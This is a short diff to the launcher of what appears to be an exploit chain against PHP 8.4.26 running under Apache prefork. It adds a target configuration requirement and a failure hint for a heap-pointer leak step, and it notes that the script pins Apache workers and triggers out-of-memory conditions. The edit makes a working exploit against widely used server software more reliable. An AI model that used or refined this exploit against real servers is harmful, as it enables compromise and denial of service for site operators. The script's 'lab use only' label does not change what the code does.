@@ -12,6 +12,7 @@ the worker at 0x7x.... The chain itself is unchanged.
 Target requirements (verified):
   * php:8.4.26-apache, stock php.ini-production
   * display_errors=Off, memory_limit=128M, post_max_size=8M
+  * output_buffering=4096 (stock php.ini-production; raw no-ini defaults fail)
   * official prefork MPM, MaxRequestWorkers=150
   * a PHP page (the launcher uses `<?php echo "OK\\n"; ?>`)
   * target reachable on 127.0.0.1; the worker-pinning step opens 149 local
@@ -142,7 +143,13 @@ def main() -> int:
               f"{args.port}", file=sys.stderr)
         print("[*] this pins Apache workers and triggers OOM; lab use only",
               file=sys.stderr)
-        return subprocess.call(cmd)
+        rc = subprocess.call(cmd)
+        if rc != 0:
+            print("hint: B1 no-heap-pointer failures usually mean the target is "
+                  "using raw no-ini defaults (output_buffering=0); copy the "
+                  "image's php.ini-production or use lab/start-pure-8426.sh",
+                  file=sys.stderr)
+        return rc
 
 
 if __name__ == "__main__":
